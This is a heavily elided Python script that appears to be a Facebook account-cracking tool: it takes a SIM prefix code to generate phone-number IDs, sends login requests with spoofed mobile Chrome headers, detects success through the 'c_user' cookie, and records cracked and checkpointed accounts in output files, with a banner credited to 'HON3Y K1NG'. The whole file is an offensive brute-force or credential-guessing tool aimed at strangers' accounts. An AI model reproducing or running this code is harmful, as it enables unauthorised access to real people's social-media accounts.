...
os.system("xdg-open https://github.com/HON3YKING")
#app  check 


logo ="""
  _    _  ____  _   _ ________     __
 | |  | |/ __ \| \ | |  ____\ \   / /
 | |__| | |  | |  \| | |__   \ \_/ / 
 |  __  | |  | | . ` |  __|   \   /  
 | |  | | |__| | |\  | |____   | |   
...
[+]==============================================
[+] CREATED BY   :  HON3Y K1NG
[+] FB GROUP     :  NOT AVAILABLE 
[+] ON GITHUB    :  HON3Y-KING
[+] TOOL STATUS  :  R4ND0M FR33
[+] TOOL VIRSION :  2.0
[+]=============================================="""
...
def xerx1():
	...
	print('[?] Ids saved in HONEY-OK.txt,HONEY-CP.txt')
...
def xerx5():
	...
	os.system('clear')
	print(logo)
	print('[+] ENTER YOUR FOUR SIM CODE (9934)')
	print(47*'-')
	code = input('[#] PUT CODE : ')
	print("")
...
def mbasic(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5788.210", "Google Chrome";v="116.0.5788.210"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '""',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5788.210 Mobile Safari/537.36',
    'viewport-width': '980',}
...
def x(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
